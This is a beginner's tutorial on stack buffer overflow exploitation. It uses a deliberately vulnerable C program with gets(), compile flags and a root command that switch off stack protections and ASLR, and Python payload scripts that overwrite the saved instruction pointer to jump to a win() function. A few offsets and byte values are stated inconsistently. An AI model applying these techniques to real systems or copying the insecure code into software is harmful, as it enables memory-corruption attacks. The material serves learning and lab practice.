# EXPLOITS
## STACK BUFFER OVERFLOW TO OVERWRITE REGISTERS BACKUPS
## REQUIRED TO UNDERTSTAND : Simple stack buffer overflow  
### REDIRECT CODE EXECUTION
When the assembly instruction `CALL <adress>` is used, it will save 2 registers on the stack, `EBP` and `EIP` (or `RBP` and `RIP` in 64 bits), for now, we don't care about EBP, it's just the base stack pointer  
But `EIP` is the instruction pointer, meaning that this register points to the next instruction adress to execute, if we change this instruction pointer to an adress we want, it will jump to it and execute the code it's holding and if the adress not exists, we're gonna have a segmentation fault  
Then with the call, if the function we call has a `ret` instruction at the end, which is called whenever a function ends in C, it will do pop `RIP` (or `EIP`), meaning that it will set this instruction pointer to the topper element in the stack, which if of course the `EIP` backup
Let's say we have this code :
```c
...
void vuln() //It has to be on another function, NOT MAIN() !!!
{
  char buffer[<BUFFER SIZE>]; //buffer to overflow
  ... // Code that can overflow the buffer ( exemple : gets(buffer); )
}
int main()
{
  vuln(); //Main calls vuln() 
}
```
To compile this code if the system is protected it should be :
```
gcc <source code file.c> -o <executable file> -fno-stack-protector -m32
# The -m32 flag is to compile on 32 bits, it's not required but just that it's a little bit more easier to exploit on 32 bits
```
So here if in `vuln()` we change the `EIP` backup and set it to whatever adress in the memory, it will jump to it and all should be good  
The disassembled code here should be like :
```nasm
<vuln adress>:
  ...
  ret //Pops the adress to EIP
<main adress>:
  ...
  call <vuln adress> //Pushes the stack with the current EIP content
```
And the stack should be organised (in 32 bits) like this :
```
[----------------------------]
buffer (<BUFFER SIZE> bytes)
EBP backup (4 bytes)
EIP backup (4 bytes)
[----------------------------]
```
A byte is 8 bits so from 0 to 255 

In this case, the content of the stack should look like :
```
[----------------------------------------------------------------]
buffer (<BUFFER SIZE> bytes)
EBP backup (4 bytes) = ...
EIP backup (4 bytes) = (<main> after the call instruction address)
[----------------------------------------------------------------]
```
So with a stack buffer overflow if we organise our payload like that :
```
|--(size of allocated buffer)--|--(EBP (4 bytes))--|--(EIP (4 bytes))--             |
|Anything......................|Anything...........|Address where we want to jump to|
```
Because the stack buffer overflow will proceed from top to bottom
So let's consider this code :
```c
#include <stdio.h>

void win() //Example address where to jump to
{
  printf("Yes, you won !\n");
}
void vuln() //It has to be on another function, NOT MAIN() !!!
{
  char buffer[64]; //buffer to overflow
  gets(buffer); // Can have a buffer overflow (even scanf("%s", buffer) works)
}
int main()
{
  vuln(); //Main calls vuln() 
}
```
To compile this code if the system is protected it should be :
```
gcc <source code file.c> -o <executable file> -fno-stack-protector -m32 -no-pie
# The -m32 flag is to compile on 32 bits, it's not required but just that it's a little bit more easier to exploit on 32 bits
# Make also sure that address space layout randomisation is disabled, run this as root :
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
So here the goal is to jump to `win()`, but we could jump to any address in the memory if it's executable  
The stack has to be like this :
```
[----]
buffer (64 bytes) = <Any character> 256 times
EBP backup (4 bytes) = <Any character> 4 times
EIP backup (4 bytes) = <win> address (4 bytes)
[----]
```
So our payload should be organised like this : 
```
|--(buffer (64 bytes))--|--(EBP (4 bytes))--|--(EIP (4 bytes))--   |
|Anything................|Anything...........|win() function address|
```
To find the `win()` function address we could use gdb :
```
gdb <target executable>
# IN GDB (gdb)>
x win
```
The output should look like :
```
0x....... <win>:	0x........
```
For this example, let's say that the `win()` address is `0x8049e15` so actually : `08 04 9e 15` in hexadecimal  
Now that we have all information and we now the `win()` function address, we can write the exploit, for this example i'm gonna use python because it's simple  
So we could imagine something like :
```python
# exploit.py file :
payload = 'A'*64 # To fill the buffer with 'A'
payload += 'B'*4 # EBP
payload += 'C'*4 # EIP
print(payload)
```
To send this to our program we could do :
```
python exploit.py > payload
```
Then to execute
```
./<executable> < payload
```
It should give a Segmentation fault  
Let's try in GDB, it should say that it can't find the address `0x 42 42 42 42` where to jump to
```
gdb <executable>
# IN GDB :
run < payload
```
So it should say `0x43434343 in ?? ()` or something else like some other characters for a certain reason, if it's not giving this address, you should adjust your payload, example, for me i had to use :
```python
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += 'C'*4 # EIP
file = open("payload", "w")
file.write(payload)
```
For me it gived in GDB :
```
0x43434343 in ?? ()
```
So it tried to jump to the `0x43434343` address which are our 'C's  
That's perfect, now i did control the EIP address !!
Okay, now to jump to the win function, we just have to set EIP backup (which is `0x43434343` for now) to the `win()` function address which is `08 04 9e 15` :
```python
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += "\x08\x04\x9e\x15" # EIP -> win() address : 0x 08 04 9e 15
file = open("payload", "w")
file.write(payload)
```
But, that's not going to work, actually, the address is wrote in the wrong way, the bytes should be reversed because that's how computer deals with addresses in memory :
```python
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += "\x15\x9e\x04\x08" # EIP -> win() address : 0x 08 04 9e 15 -> 0x 15 9e 04 08
file = open("payload", "w")
file.write(payload)
```
Or, we could also use a python module which is `struct` which is simpler to use for these things :
```python
import struct
payload = "A"*64 # Fill the buffer with 'A' (0x41)
payload += 'X'*8 # I don't really now why, but i had to add this 8 bytes to shift it right
payload += 'B'*4 # EBP
payload += struct.pack("I", 0x08049e15) # EIP (address not reversed in this case, it should be "Q" instead of "I" if it's on 64 bits)
file = open("payload", "w")
file.write(payload)
```
All seems good
Now :
```
python2 exploit.py
# Notice that i've used python version 2 for the struct module
./<executable> < payload
# You should get the "Yes, you won !" message
```
Thanks for have reading this !
### 64 bits : 
In 64 bits, EIP backup and EBP backup and the other value which is overwrote with 'X' here length is multiplied by 2, and we also need to add some null bytes after the address because there are some indesirable bytes before it, so our exploit will be :
```python
import struct
payload = "A"*64 # Fill the buffer with 'A' (0x41) (we don't multiply the buffer size by 2)
payload += 'X'*16 # 8 * 2
payload += 'B'*8 # 4 * 2
payload += struct.pack("Q", <ADDRESS>)+"\x00"*2 # Here it's "Q" because it's 64 bits
file = open("payload", "w")
file.write(payload)
```
Note : Sometimes the offset can be `24` and sometimes it could be `8`
### Find the offset before overwriting EIP backup
To find he offset before overwriting EIP backup, we can use a simple pattern like alphabet or even more complex patterns, at the moment where we get a segfault, it means that we overwrote EIP backup, so let's do a simple pattern finder python exploit :
```python
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" # And so forth
print(payload)
```
Then :
```
python exploit.py | ./vuln
```
If we got a segmentation fault, it means that one of the values overwrote the EIP backup, so let's check in gdb :
```
python exploit.py > payload
gdb <executable>
# (GDB)>
run < payload
```
And then we get the message : `0xXXXXXXXX` in ?? (in 32 bits)
Then if **XX XX XX XX** are for example **54 54 54 54**, it means that we overwrote EIP backup with the character in our padding which has the asscii value XX (in hex) which is in this case 0x54 -> 'T' so the exact match for our offset is at index of our padding which is just before the first 'T' :
```python
payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS" # We removed all which is after the character that is just before the first 'T'
print("Exact match at index "+str(len(payload)))
```
Which prints in this case (buffer size : 64 bytes):
```
Exact match at index 76
```
So we know that just before overwriting EIP backup in this case, we have to enter 76 bytes  
In 64 bits, it's the same except that we double the length of each single character sequence :
```python
payload = "AAAAAAAABBBBBBBBCCCCCCCC..." # And so forth...
print(payload)
```
